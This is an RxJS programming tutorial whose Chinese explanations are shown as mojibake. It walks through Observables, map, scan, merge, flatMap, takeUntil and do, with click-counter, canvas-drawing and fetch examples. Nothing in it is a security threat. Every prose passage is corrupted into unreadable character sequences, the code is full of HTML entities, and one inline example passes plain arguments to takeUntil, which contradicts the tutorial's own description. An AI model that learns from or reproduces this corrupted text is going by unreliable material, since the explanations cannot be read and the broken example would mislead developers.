æˆ‘ç†è§£è³‡æ–™æµäº†ï¼Œç„¶å¾Œå‘¢ï¼Ÿä¸Šé¢æœ‰èªªéï¼Œæˆ‘å€‘å¯ä»¥æŠŠä»»ä½•ä¸€å€‹æ±è¥¿è½‰æˆ Observableï¼Œè®“å®ƒè®Šæˆè³‡æ–™æµï¼Œå¯æ˜¯é€™ä¸å°±è·Ÿ addEventListener ä¸€æ¨£å—ï¼Ÿæœ‰ä»€éº¼ç‰¹åˆ¥çš„ï¼Ÿ
æœ‰ï¼Œé‚„çœŸçš„æ¯”è¼ƒç‰¹åˆ¥ã€‚
å¸Œæœ›ä½ æ²’æœ‰å¿˜è¨˜æˆ‘å€‘å‰›é–‹å§‹åšçš„é‚£å€‹å°ç·´ç¿’ï¼Œå°±æ˜¯æŠŠä¸€å€‹é™£åˆ—é€éä¸€ç³»åˆ—è½‰æ›ï¼Œè®Šæˆæˆ‘å€‘è¦çš„è³‡æ–™çš„é‚£å€‹ç·´ç¿’ã€‚æˆ‘å‰›å‰›æœ‰èªªï¼Œä½ å¯ä»¥æŠŠ Observable æƒ³æˆæ˜¯ã€Œæœƒä¸€ç›´å¢åŠ å…ƒç´ çš„é™£åˆ—ã€ï¼Œé€™ä»£è¡¨ä»€éº¼å‘¢ï¼Ÿ
ä»£è¡¨æˆ‘å€‘ä¹Ÿå¯ä»¥æŠŠ Observable åšä¸€ç³»åˆ—çš„è½‰æ›ï¼æˆ‘å€‘ä¹Ÿå¯ä»¥ç”¨é‚£äº›ç”¨åœ¨é™£åˆ—ä¸Šçš„ functionï¼
Rx.Observable.fromEvent(window, &#x27;click&#x27;)  .map(e =&gt; e.target)  .subscribe(value =&gt; &#123;    console.log(&#x27;click: &#x27;, value)  &#125;)


æˆ‘å€‘æŠŠ click äº‹ä»¶ç¶“é map è½‰æ›ç‚ºé»æ“Šåˆ°çš„ elementï¼Œæ‰€ä»¥ç•¶æˆ‘å€‘æœ€å¾Œåœ¨ subscribe çš„æ™‚å€™ï¼Œæ”¶åˆ°çš„ value å°±æœƒæ˜¯æˆ‘å€‘é»æ“Šçš„æ±è¥¿ã€‚
æ¥è‘—ä¾†çœ‹ä¸€å€‹ç¨å¾®é€²éšä¸€é»çš„ä¾‹å­ï¼š
Rx.Observable.fromEvent(window, &#x27;click&#x27;)  .map(e =&gt; 1)  .scan((total, now) =&gt; total + now)  .subscribe(value =&gt; &#123;    document.querySelector(&#x27;#counter&#x27;).innerText = value;  &#125;)


é¦–å…ˆæˆ‘å€‘å…ˆæŠŠæ¯ä¸€å€‹ click äº‹ä»¶éƒ½é€émapè½‰æ›æˆ 1ï¼ˆæˆ–è€…ä½ ä¹Ÿå¯ä»¥å¯«æˆ.mapTo(1)ï¼‰ï¼Œæ‰€ä»¥æ¯æŒ‰ä¸€æ¬¡å°±é€å‡ºä¸€å€‹æ•¸å­— 1ã€‚scançš„è©±å…¶å¯¦å°±æ˜¯æˆ‘å€‘ä¸€é–‹å§‹å°é™£åˆ—ç”¨çš„reduceï¼Œä½ å¯ä»¥æƒ³æˆæ˜¯æ›å€‹åå­—è€Œå·²ã€‚é€éscanåŠ ç¸½ä»¥å¾Œå‚³çµ¦ subscriberï¼Œé¡¯ç¤ºåœ¨é é¢ä¸Šé¢ã€‚
å°±é€™æ¨£ç°¡å–®å¹¾è¡Œï¼Œå°±å®Œæˆäº†ä¸€å€‹è¨ˆç®—é»æ“Šæ¬¡æ•¸çš„ counterã€‚
å¯ä»¥ç”¨ä¸€å€‹ç°¡å–®çš„ gif åœ–ä¾†è¡¨ç¤ºä¸Šé¢çš„ç¯„ä¾‹ï¼š

å¯æ˜¯ Observable ä¸åªé€™æ¨£è€Œå·²ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘è¦é€²å…¥åˆ°å®ƒæœ€å²å®³çš„åœ°æ–¹äº†ã€‚
å¨åŠ›ç„¡çª®çš„çµ„åˆæŠ€å¦‚æœæŠŠå…©å€‹é™£åˆ—åˆä½µï¼Œæœƒè®Šæˆä»€éº¼ï¼Ÿä¾‹å¦‚èªª[1, 2, 3]è·Ÿ[4, 5, 6]ï¼Ÿ
é€™è¦çœ‹ä½ æŒ‡çš„ã€Œåˆä½µã€æ˜¯ä»€éº¼ï¼Œå¦‚æœæ˜¯æŒ‡ä¸²æ¥ï¼Œé‚£å°±æ˜¯[1, 2, 3, 4, 5, 6]ï¼Œå¦‚æœæ˜¯æŒ‡ç›¸åŠ ï¼Œé‚£å°±æ˜¯[5, 7, 9]ã€‚
é‚£å¦‚æœæŠŠå…©å€‹ Observable åˆä½µæœƒè®Šæˆä»€éº¼ï¼Ÿ
Observable è·Ÿé™£åˆ—çš„å·®åˆ¥å°±åœ¨æ–¼å¤šäº†ä¸€å€‹ç¶­åº¦ï¼šæ™‚é–“ã€‚
Observable æ˜¯ã€Œæ™‚é–“åºåˆ—ä¸Šçš„ä¸€é€£ä¸²è³‡æ–™äº‹ä»¶ã€ï¼Œå°±åƒæˆ‘å‰é¢è¬›çš„ä¸€æ¨£ï¼Œå¯ä»¥çœ‹æˆæ˜¯ä¸€å€‹ä¸€ç›´æœƒæœ‰æ–°è³‡æ–™é€²ä¾†çš„é™£åˆ—ã€‚
æˆ‘å€‘å…ˆä¾†çœ‹çœ‹ä¸€å¼µå¾ˆæ£’çš„åœ–ï¼Œå¾ˆæ¸…æ¥šåœ°è§£é‡‹äº†å…©å€‹ Observable åˆä½µæœƒè®Šæˆä»€éº¼ï¼š
ï¼ˆå–è‡ªï¼šhttp://rxmarbles.com/#mergeï¼‰
ä¸Šé¢æ˜¯ä¸€å€‹ Observableï¼Œæ¯ä¸€å€‹åœ“é»ä»£è¡¨ä¸€å€‹è³‡æ–™ï¼Œä¸‹é¢ä¹Ÿæ˜¯ä¸€æ¨£ï¼ŒæŠŠé€™å…©å€‹åˆä½µä¹‹å¾Œå°±è®Šæˆæœ€ä¸‹é¢é‚£ä¸€æ¢ï¼Œçœ‹åœ–è§£æ‡‰è©²é‚„æ»¿å¥½æ‡‚çš„ï¼Œå°±åƒæ˜¯æŠŠå…©å€‹æ™‚é–“è»¸åˆä½µä¸€æ¨£ã€‚
è®“æˆ‘å€‘ä¾†çœ‹ä¸€å€‹å¯ä»¥å±•ç¾åˆä½µå¼·å¤§ä¹‹è™•çš„ç¯„ä¾‹ï¼Œæˆ‘å€‘æœ‰ +1 è·Ÿ -1 å…©å€‹æŒ‰éˆ•ä»¥åŠæ–‡å­—é¡¯ç¤ºç¾åœ¨çš„æ•¸å­—æ˜¯å¤šå°‘ï¼š

è©²æ€éº¼é”æˆé€™å€‹åŠŸèƒ½å‘¢ï¼ŸåŸºæœ¬çš„æƒ³æ³•å°±æ˜¯æˆ‘å€‘å…ˆæŠŠæ¯å€‹ +1 çš„ click äº‹ä»¶éƒ½é€šémapToè®Šæˆæ•¸å­— 1ï¼Œå–å« Observable_plus1 å¥½äº†ã€‚å†åšå‡ºä¸€å€‹ Observable_minus1 æ˜¯æŠŠæ¯å€‹ -1 çš„ click äº‹ä»¶éƒ½é€šémapToè®Šæˆæ•¸å­— -1ã€‚
æŠŠé€™å…©å€‹ Observable åˆä½µä¹‹å¾Œï¼Œå†åˆ©ç”¨å‰›å‰›æåˆ°çš„scanåŠ ç¸½ï¼Œå°±æ˜¯ç›®å‰æ‡‰è©²è¦é¡¯ç¤ºçš„æ•¸å­—äº†ï¼
Rx.Observable.fromEvent(document.querySelector(&#x27;input[name=plus]&#x27;), &#x27;click&#x27;)  .mapTo(1)  .merge(    Rx.Observable.fromEvent(document.querySelector(&#x27;input[name=minus]&#x27;), &#x27;click&#x27;)      .mapTo(-1)  )  .scan((total, now) =&gt; total + now)  .subscribe(value =&gt; &#123;    document.querySelector(&#x27;#counter&#x27;).innerText = value;  &#125;)

å¦‚æœä½ é‚„æ˜¯ä¸æ‡‚çš„è©±ï¼Œå¯ä»¥åƒè€ƒä¸‹é¢çš„ç²¾ç¾ç¯„ä¾‹ï¼Œç¤ºç¯„é€™å…©å€‹ Observable æ˜¯æ€éº¼åˆåœ¨ä¸€èµ·çš„ï¼ˆOä»£è¡¨é»æ“Šäº‹ä»¶ï¼Œ+1è·Ÿ-1å‰‡æ˜¯mapToä¹‹å¾Œçš„çµæœï¼‰ï¼š

è®“æˆ‘å€‘ä¾†æ¯”è¼ƒä¸€ä¸‹å¦‚æœä¸ç”¨ Observable çš„è©±ï¼Œç¨‹å¼ç¢¼æœƒé•·æ€æ¨£ï¼š
var total = 0;document.querySelector(&#x27;input[name=plus]&#x27;).addEventListener(&#x27;click&#x27;, () =&gt; &#123;  total++;  document.querySelector(&#x27;#counter&#x27;).innerText = total;&#125;)  document.querySelector(&#x27;input[name=minus]&#x27;).addEventListener(&#x27;click&#x27;, () =&gt; &#123;  total--;  document.querySelector(&#x27;#counter&#x27;).innerText = total;&#125;)

æœ‰æ²’æœ‰ç™¼è¦ºå…©è€…çœŸçš„å·®åˆ¥å¾ˆå¤§ï¼Ÿå°±å¦‚åŒæˆ‘ä¹‹å‰æ‰€èªªçš„ï¼Œæ˜¯å…©ç¨®å®Œå…¨ä¸åŒçš„æ€è€ƒæ¨¡å¼ï¼Œæ‰€ä»¥ Reactive Programming å›°é›£çš„åœ°æ–¹ä¸æ˜¯åœ¨æ–¼ç†è§£ï¼Œä¹Ÿä¸æ˜¯åœ¨æ–¼èªæ³•ï¼ˆé€™å…©è€…ç›¸ä¿¡ä½ ç›®å‰éƒ½æœ‰äº›æ¦‚å¿µäº†ï¼‰ï¼Œè€Œæ˜¯åœ¨æ–¼æ›ä¸€ç¨®å…¨æ–°çš„æ€è€ƒæ¨¡å¼ã€‚
ä»¥ä¸Šé¢çš„å¯«æ³•ä¾†èªªï¼Œå°±æ˜¯å‘Šè¨´é›»è…¦ï¼šã€ŒæŒ‰ä¸‹åŠ çš„æ™‚å€™å°±æŠŠä¸€å€‹è®Šæ•¸ +1ï¼Œç„¶å¾Œæ›´æ”¹æ–‡å­—ï¼›æŒ‰ä¸‹æ¸›çš„æ™‚å€™å°± -1 ä¸¦ä¸”ä¹Ÿæ›´æ”¹æ–‡å­—ã€ï¼Œå°±å¯ä»¥é”æˆè¨ˆæ•¸å™¨çš„åŠŸèƒ½ã€‚
ä»¥ Reactive çš„å¯«æ³•ï¼Œå°±æ˜¯æŠŠæŒ‰ä¸‹åŠ ç•¶æˆä¸€å€‹è³‡æ–™æµï¼ŒæŠŠæŒ‰ä¸‹æ¸›ä¹Ÿç•¶æˆä¸€å€‹è³‡æ–™æµï¼Œå†é€éå„ç¨® function æŠŠé€™å…©å€‹æµè½‰æ›ä¸¦ä¸”åˆä½µèµ·ä¾†ï¼Œè®“æœ€å¾Œçš„é‚£å€‹æµå°±æ˜¯æˆ‘å€‘æƒ³è¦çš„çµæœï¼ˆè¨ˆæ•¸å™¨ï¼‰ã€‚
ä½ ç¾åœ¨æ‡‰è©²èƒ½é«”æœƒåˆ°æˆ‘ä¸€é–‹å§‹èªªçš„äº†ï¼šã€ŒæŠŠåŸå§‹è³‡æ–™ç¶“éä¸€é€£ä¸²çš„è½‰æ›ï¼Œæœ€å¾Œè®Šæˆä½ æƒ³è¦çš„ç­”æ¡ˆã€ï¼Œé€™é»å°±æ˜¯ Reactive Programming æœ€å¤§çš„ç‰¹è‰²ã€‚
çµ„åˆæŠ€ä¸­çš„çµ„åˆæŠ€æˆ‘å€‘ä¾†çœ‹ä¸€å€‹æ›´è¤‡é›œä¸€é»çš„ç¯„ä¾‹ï¼Œæ˜¯åœ¨ canvas ä¸Šé¢å¯¦ç¾éå¸¸ç°¡å–®çš„ç¹ªåœ–åŠŸèƒ½ï¼Œå°±æ˜¯æ»‘é¼ æŒ‰ä¸‹å»ä¹‹å¾Œå¯ä»¥ç•«ç•«ï¼Œæ”¾é–‹ä¾†å°±åœæ­¢ã€‚

è¦å¯¦ç¾é€™å€‹åŠŸèƒ½å¾ˆé–“å–®ï¼Œcanvas æä¾›lineTo(x, y)é€™å€‹æ–¹æ³•ï¼Œåªè¦åœ¨æ»‘é¼ ç§»å‹•æ™‚ä¸æ–·å‘¼å«é€™å€‹æ–¹æ³•ï¼Œå°±å¯ä»¥ä¸æ–·ç•«å‡ºåœ–å½¢ä¾†ã€‚ä½†æœ‰ä¸€é»è¦æ³¨æ„çš„æ˜¯ç•¶ä½ åœ¨æŒ‰ä¸‹æ»‘é¼ æ™‚ï¼Œæ‡‰è©²å…ˆå‘¼å«moveTo(x, y)æŠŠç¹ªåœ–çš„é»ç§»åˆ°æŒ‡å®šä½ç½®ï¼Œç‚ºä»€éº¼å‘¢ï¼Ÿ
å‡è¨­æˆ‘å€‘ç¬¬ä¸€æ¬¡ç•«åœ–æ˜¯åœ¨å·¦ä¸Šè§’ï¼Œç¬¬äºŒæ¬¡æŒ‰ä¸‹æ»‘é¼ çš„ä½ç½®æ˜¯åœ¨å³ä¸‹è§’ï¼Œå¦‚æœæ²’æœ‰å…ˆç”¨moveToç§»å‹•è€Œæ˜¯ç›´æ¥ç”¨lineToçš„è©±ï¼Œå°±æœƒå¤šä¸€æ¢ç·šå¾å·¦ä¸Šè§’å»¶ä¼¸åˆ°å³ä¸‹è§’ã€‚moveToè·ŸlineToçš„å·®åˆ¥å°±æ˜¯å‰è€…åªæ˜¯ç§»å‹•ï¼Œå¾Œè€…æœƒè·Ÿä¸Šæ¬¡çš„é»é€£æ¥åœ¨ä¸€èµ·ç•«æˆä¸€æ¢ç·šã€‚

var canvas = document.getElementById(&#x27;canvas&#x27;);var ctx = canvas.getContext(&#x27;2d&#x27;);ctx.beginPath(); // é–‹å§‹ç•«ç•«  function draw(e)&#123;  ctx.lineTo(e.clientX,e.clientY); // ç§»åˆ°æ»‘é¼ åœ¨çš„ä½ç½®  ctx.stroke(); // ç•«ç•«&#125;  // æŒ‰ä¸‹å»æ»‘é¼ æ‰é–‹å§‹åµæ¸¬ mousemove äº‹ä»¶canvas.addEventListener(&#x27;mousedown&#x27;, function(e)&#123;  ctx.moveTo(e.clientX, e.clientY); // æ¯æ¬¡æŒ‰ä¸‹çš„æ™‚å€™å¿…é ˆè¦å…ˆæŠŠç¹ªåœ–çš„é»ç§»åˆ°é‚£é‚Šï¼Œå¦å‰‡æœƒå—ä¸Šæ¬¡ç•«çš„ä½ç½®å½±éŸ¿  canvas.addEventListener(&#x27;mousemove&#x27;, draw);&#125;)  // æ”¾é–‹æ»‘é¼ å°±åœæ­¢åµæ¸¬ canvas.addEventListener(&#x27;mouseup&#x27;, function(e)&#123;  canvas.removeEventListener(&#x27;mousemove&#x27;, draw);&#125;)

é‚£å¦‚æœåœ¨ RxJS è£¡é¢ï¼Œè©²æ€éº¼å¯¦ä½œé€™å€‹åŠŸèƒ½å‘¢ï¼Ÿ
é¦–å…ˆæ†‘ç›´è¦ºï¼Œæ‡‰è©²å°±æ˜¯å…ˆåŠ ä¸Šmousedownçš„äº‹ä»¶å°å§ï¼è‡³å°‘æœ‰å€‹é–‹é ­ã€‚
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .subscribe(e =&gt; &#123;    console.log(&#x27;mousedown&#x27;);  &#125;)

å¯æ˜¯æ»‘é¼ æŒ‰ä¸‹å»ä¹‹å¾Œæ‡‰è©²è¦è®Šæˆä»€éº¼ï¼Ÿé€™å€‹æ™‚å€™æ‡‰è©²è¦é–‹å§‹ç›£è½mousemoveå°å§ï¼Œæ‰€ä»¥æˆ‘å€‘é€™æ¨£å¯«ï¼Œç”¨mapToæŠŠæ¯ä¸€å€‹mousedownçš„äº‹ä»¶éƒ½è½‰æ›æˆmousemoveçš„ Observableï¼š
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .mapTo(    Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;)  )  .subscribe(value =&gt; &#123;    console.log(&#x27;value: &#x27;, value);  &#125;)

æ¥è‘—ä½ çœ‹ä¸€ä¸‹ consoleï¼Œä½ æœƒç™¼ç¾æ¯ç•¶æˆ‘é»æ“Šçš„æ™‚å€™ï¼Œconsole å°±æœƒå°å‡ºFromEventObservable &#123;_isScalar: false, sourceObj: canvas#canvas, eventName: &quot;mousemove&quot;, selector: undefined, options: undefined&#125;
ä»”ç´°æƒ³ä¸€ä¸‹ä½ æœƒç™¼ç¾ä¹Ÿæ»¿åˆç†çš„ï¼Œå› ç‚ºæˆ‘ç”¨mapToæŠŠæ¯ä¸€å€‹æ»‘é¼ æŒ‰ä¸‹å»çš„äº‹ä»¶è½‰æˆä¸€å€‹ mousemove çš„ Observableï¼Œæ‰€ä»¥ç”¨ subscribe è¨‚é–±ä¹‹å¾Œæ‹¿åˆ°çš„æ±è¥¿å°±æœƒæ˜¯é€™å€‹ Observableã€‚å¦‚æœç•«æˆåœ–ï¼Œå¤§æ¦‚é•·å¾—åƒé€™æ¨£ï¼š

å¥½äº†ï¼Œé‚£æ€éº¼è¾¦å‘¢ï¼Ÿæˆ‘æƒ³è¦çš„å…¶å¯¦ä¸æ˜¯ Observable æœ¬èº«ï¼Œè€Œæ˜¯å±¬æ–¼é€™å€‹ Observable è£¡é¢çš„é‚£äº›æ±è¥¿å•Šï¼ç¾åœ¨é€™å€‹æƒ…å½¢å°±æ˜¯ Observable è£¡é¢åˆæœ‰ Observableï¼Œæœ‰å…©å±¤ï¼Œå¯æ˜¯æˆ‘æƒ³è¦è®“å®ƒè®Šæˆä¸€å±¤å°±å¥½ï¼Œè©²æ€éº¼è¾¦å‘¢ï¼Ÿ
åœ¨æ­¤æä¾›ä¸€å€‹è®“ Observable è®Šç°¡å–®çš„è¨£ç«…ï¼š

åªè¦æœ‰å•é¡Œï¼Œå…ˆæƒ³æƒ³ Array å°±å°äº†ï¼

æˆ‘å‰é¢æœ‰æéï¼Œå¯ä»¥æŠŠ Observable çœ‹æˆæ˜¯åŠ ä¸Šæ™‚é–“ç¶­åº¦çš„é€²éšç‰ˆé™£åˆ—ï¼Œå› æ­¤åªè¦æ˜¯é™£åˆ—æœ‰çš„æ–¹æ³•ï¼ŒObservable é€šå¸¸ä¹Ÿéƒ½æœƒæœ‰ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œä¸€å€‹é™£åˆ—å¯èƒ½é•·é€™æ¨£ï¼š[1, [2, 2.5], 3, [4, 5]]ä¸€å…±æœ‰å…©å±¤ï¼Œç¬¬äºŒå±¤ä¹Ÿæ˜¯ä¸€å€‹é™£åˆ—ã€‚
å¦‚æœæƒ³è®“å®ƒè®Šä¸€å±¤çš„è©±æ€éº¼è¾¦å‘¢ï¼Ÿå£“å¹³ï¼
æœ‰ç”¨é lodash æˆ–æ˜¯å…¶ä»–é¡ä¼¼çš„ library çš„è©±ï¼Œä½ æ‡‰è©²æœ‰è½é_.flattené€™å€‹æ–¹æ³•ï¼Œå¯ä»¥æŠŠé€™ç¨®é™£åˆ—å£“å¹³ï¼Œè®Šæˆï¼š[1, 2, 2.5, 3, 4, 5]ã€‚
ç”¨ flat é€™å€‹é—œéµå­—å»æœå°‹ Rx æ–‡ä»¶çš„è©±ï¼Œä½ æœƒæ‰¾åˆ°ä¸€å€‹æ–¹æ³•å«åš FlatMapï¼Œç°¡å–®ä¾†èªªå°±æ˜¯å…ˆmapä¹‹å¾Œå†è‡ªå‹•å¹«ä½ å£“å¹³ã€‚
æ‰€ä»¥ï¼Œæˆ‘å€‘å¯ä»¥æŠŠç¨‹å¼ç¢¼æ”¹æˆé€™æ¨£ï¼š
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;))              .subscribe(e =&gt; &#123;    console.log(e);  &#125;)

ç•¶ä½ é»æ“Šä¹‹å¾Œï¼Œæœƒç™¼ç¾éš¨è‘—æ»‘é¼ ç§»å‹•ï¼Œconsole æœƒå°å‡ºä¸€å¤§å † logï¼Œå°±ä»£è¡¨æˆ‘å€‘æˆåŠŸäº†ã€‚
ç•«æˆç¤ºæ„åœ–çš„è©±æœƒè®Šæˆé€™æ¨£ï¼ˆç‚ºäº†æ–¹ä¾¿èªªæ˜ï¼Œæˆ‘æŠŠflatMapåœ¨åœ–ç‰‡ä¸Šè®Šæˆmapè·Ÿflattenå…©å€‹æ­¥é©Ÿï¼‰ï¼š

æ¥ä¸‹ä¾†å‘¢ï¼Ÿæ¥ä¸‹ä¾†æˆ‘å€‘è¦è®“å®ƒå¯ä»¥åœ¨æ»‘é¼ é¬†é–‹çš„æ™‚å€™åœæ­¢ï¼Œè©²æ€éº¼åšå‘¢ï¼ŸRxJS æœ‰ä¸€å€‹æ–¹æ³•å«åštakeUntilï¼Œæ„æ€å°±æ˜¯æ‹¿åˆ°â€¦ç™¼ç”Ÿç‚ºæ­¢ï¼Œå‚³é€²å»çš„åƒæ•¸å¿…é ˆæ˜¯ä¸€å€‹ Observableã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœå¯«.takeUntil(window, &#39;click&#39;)ï¼Œå°±è¡¨ç¤ºå¦‚æœä»»ä½•windowçš„é»æ“Šäº‹ä»¶ç™¼ç”Ÿï¼Œé€™å€‹ Observable å°±æœƒç«‹åˆ»çµ‚æ­¢ï¼Œä¸æœƒå†é€å‡ºä»»ä½•è³‡æ–™ã€‚
æ‡‰ç”¨åœ¨ç¹ªç•«çš„ä¾‹å­ä¸Šï¼Œæˆ‘å€‘åªè¦æŠŠtakeUntilå¾Œé¢å‚³çš„åƒæ•¸æ›æˆæ»‘é¼ é¬†é–‹å°±å¥½ï¼é †ä¾¿æŠŠsubscribeè·Ÿç•«ç•«çš„ function ä¹Ÿä¸€èµ·å®Œæˆå§ï¼
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;))  .takeUntil(Rx.Observable.fromEvent(canvas, &#x27;mouseup&#x27;))           .subscribe(e =&gt; &#123;    draw(e);  &#125;)

æ”¹å®Œä¹‹å¾Œé¦¬ä¸Šä¾†å¯¦é©—ä¸€ä¸‹ï¼æ»‘é¼ æŒ‰ä¸‹å»ä¹‹å¾Œé †åˆ©é–‹å§‹ç•«åœ–ï¼Œé¬†é–‹ä»¥å¾Œç•«åœ–åœæ­¢ï¼Œå®Œç¾ï¼
å’¦ï¼Œå¯æ˜¯æ€éº¼æŒ‰ä¸‹ç¬¬äºŒæ¬¡å°±æ²’åæ‡‰äº†ï¼Ÿæˆ‘å€‘åšå‡ºäº†ä¸€å€‹ã€Œåªèƒ½å¤ æˆåŠŸç•«ä¸€æ¬¡åœ–ã€çš„ Observableã€‚
ç‚ºä»€éº¼å‘¢ï¼Ÿæˆ‘å€‘å¯ä»¥å…ˆä¾†çœ‹ä¸€ä¸‹takeUntilçš„ç¤ºæ„åœ–ï¼ˆå–è‡ªï¼šhttp://rxmarbles.com/#takeUntilï¼‰

ä»¥æˆ‘å€‘çš„æƒ…å½¢ä¾†èªªï¼Œå°±æ˜¯åªè¦mouseupäº‹ä»¶ç™¼ç”Ÿï¼Œã€Œæ•´å€‹ Observableã€å°±æœƒåœæ­¢ï¼Œæ‰€ä»¥åªæœ‰ç¬¬ä¸€æ¬¡èƒ½å¤ ç•«åœ–æˆåŠŸã€‚ä½†æˆ‘å€‘æƒ³è¦çš„å…¶å¯¦ä¸æ˜¯é€™æ¨£ï¼Œæˆ‘å€‘æƒ³è¦çš„æ˜¯åªæœ‰mousemoveåœæ­¢è€Œå·²ï¼Œè€Œä¸æ˜¯æ•´å€‹éƒ½åœæ­¢ã€‚
æ‰€ä»¥ï¼Œæˆ‘å€‘æ‡‰è©²æŠŠtakeUntilæ”¾åœ¨mousemoveçš„å¾Œé¢ï¼Œä¹Ÿå°±æ˜¯ï¼š
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;)      .takeUntil(Rx.Observable.fromEvent(canvas, &#x27;mouseup&#x27;))    )  .subscribe(e =&gt; &#123;    draw(e);  &#125;)

é€™æ¨£å­è£¡é¢çš„é‚£å€‹mousemoveçš„ Observable å°±æœƒåœ¨æ»‘é¼ é¬†é–‹æ™‚åœæ­¢ç™¼é€äº‹ä»¶ï¼Œè€Œæˆ‘å€‘æœ€å¤–å±¤çš„é€™å€‹ Observable ç›£è½çš„æ˜¯æ»‘é¼ æŒ‰ä¸‹ï¼Œæœƒä¸€ç›´ç›£è½ä¸‹å»ã€‚
åˆ°é€™é‚Šå…¶å¯¦å°±å·®ä¸å¤šäº†ï¼Œä½†é‚„æœ‰ä¸€å€‹å° bug è¦ä¿®ï¼Œå°±æ˜¯æˆ‘å€‘æ²’æœ‰åœ¨mousedownçš„æ™‚å€™åˆ©ç”¨moveToç§»å‹•ï¼Œé€ æˆæˆ‘å€‘ä¸€é–‹å§‹èªªçš„é‚£å€‹æœƒæŠŠä¸Šæ¬¡ç•«çš„è·Ÿé€™æ¬¡ç•«çš„é€£åœ¨ä¸€èµ·çš„å•é¡Œã€‚
é‚£æ€éº¼è¾¦å‘¢ï¼Ÿæˆ‘å·²ç¶“æŠŠmousedownäº‹ä»¶è½‰æˆå…¶ä»–è³‡æ–™æµäº†ï¼Œæˆ‘è¦æ€éº¼åœ¨mousedownçš„æ™‚å€™åšäº‹ï¼Ÿ
æœ‰ä¸€å€‹æ–¹æ³•å«åšdoï¼Œå°±æ˜¯ç‚ºäº†é€™ç¨®æƒ…å½¢è€Œè¨­ç«‹çš„ï¼Œä½¿ç”¨æ™‚æ©Ÿæ˜¯ï¼šã€Œä½ æƒ³åšä¸€é»äº‹ï¼Œå»åˆä¸æƒ³å½±éŸ¿è³‡æ–™æµã€ï¼Œæœ‰é»åƒæ˜¯èƒ½å¤ é‡å°ä¸åŒéšæ®µ subscribe çš„æ„Ÿè¦ºï¼Œmousedownçš„æ™‚å€™ subscribe ä¸€æ¬¡ï¼Œæœ€å¾Œè¦ç•«åœ–çš„æ™‚å€™åˆ subscribe ä¸€æ¬¡ã€‚
Rx.Observable.fromEvent(canvas, &#x27;mousedown&#x27;)  .do(e =&gt; &#123;    ctx.moveTo(e.clientX, e.clientY)  &#125;)  .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, &#x27;mousemove&#x27;)      .takeUntil(Rx.Observable.fromEvent(canvas, &#x27;mouseup&#x27;))    )  .subscribe(e =&gt; &#123;    draw(e);  &#125;)

åˆ°é€™é‚Šï¼Œæˆ‘å€‘å°±é †åˆ©å®Œæˆäº†ç•«åœ–çš„åŠŸèƒ½ã€‚
å¦‚æœä½ æƒ³è©¦è©¦çœ‹ä½ æœ‰æ²’æœ‰ææ‡‚ï¼Œå¯ä»¥å¯¦ä½œçœ‹çœ‹æ‹–æ‹‰ç§»å‹•ç‰©é«”çš„åŠŸèƒ½ï¼ŒåŸç†è·Ÿé€™å€‹å¾ˆé¡ä¼¼ï¼Œéƒ½æ˜¯åµæ¸¬æ»‘é¼ çš„äº‹ä»¶ä¸¦ä¸”åšå‡ºåæ‡‰ã€‚
å–å£æ°´ä¼‘æ¯ä¸€ä¸‹ï¼Œä¸‹åŠå ´è¦é–‹å§‹äº†ä¸ŠåŠå ´çš„ç›®æ¨™åœ¨æ–¼è®“ä½ ç†è§£ä»€éº¼æ˜¯ Rxï¼Œä¸¦ä¸”æŒæ¡å¹¾å€‹åŸºæœ¬æ¦‚å¿µï¼š

ä¸€å€‹è³‡æ–™æµå¯ä»¥ç¶“éä¸€ç³»åˆ—è½‰æ›ï¼Œè®Šæˆå¦ä¸€å€‹è³‡æ–™æµ
é€™äº›è½‰æ›åŸºæœ¬ä¸Šéƒ½è·Ÿé™£åˆ—æœ‰çš„å·®ä¸å¤šï¼Œåƒæ˜¯mapã€filterã€flattenç­‰ç­‰
ä½ å¯ä»¥åˆä½µå¤šå€‹ Observableï¼Œä¹Ÿå¯ä»¥æŠŠäºŒç¶­çš„ Observable å£“å¹³

ä¸‹åŠå ´å°ˆæ³¨çš„é»å‰‡æ˜¯åœ¨æ–¼å¯¦æˆ°æ‡‰ç”¨ï¼Œä¸¦ä¸”åœç¹è‘— RxJS æœ€é©åˆçš„å ´æ™¯ä¹‹ä¸€ï¼šAPIã€‚
å‰é¢æˆ‘å€‘æœ‰æåˆ°èªªå¯ä»¥æŠŠ DOM ç‰©ä»¶çš„ event è®Šæˆè³‡æ–™æµï¼Œä½†é™¤äº†é€™å€‹ä»¥å¤–ï¼ŒPromise å…¶å¯¦ä¹Ÿå¯ä»¥è®Šæˆè³‡æ–™æµã€‚æ¦‚å¿µå…¶å¯¦ä¹Ÿå¾ˆç°¡å–®å•¦ï¼Œå°±æ˜¯ Promise è¢« resovle çš„æ™‚å€™å°±ç™¼é€ä¸€å€‹è³‡æ–™ï¼Œè¢« reject çš„æ™‚å€™å°±çµ‚æ­¢ã€‚
è®“æˆ‘å€‘ä¾†çœ‹ä¸€å€‹ç°¡å–®çš„å°ç¯„ä¾‹ï¼Œæ¯æŒ‰ä¸€æ¬¡æŒ‰éˆ•å°±æœƒç™¼é€ä¸€å€‹ request
function sendRequest () &#123;  return fetch(&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;).then(res =&gt; res.json())&#125;  Rx.Observable.fromEvent(document.querySelector(&#x27;input[name=send]&#x27;), &#x27;click&#x27;)  .flatMap(e =&gt; Rx.Observable.fromPromise(sendRequest()))  .subscribe(value =&gt; &#123;    console.log(value)  &#125;)

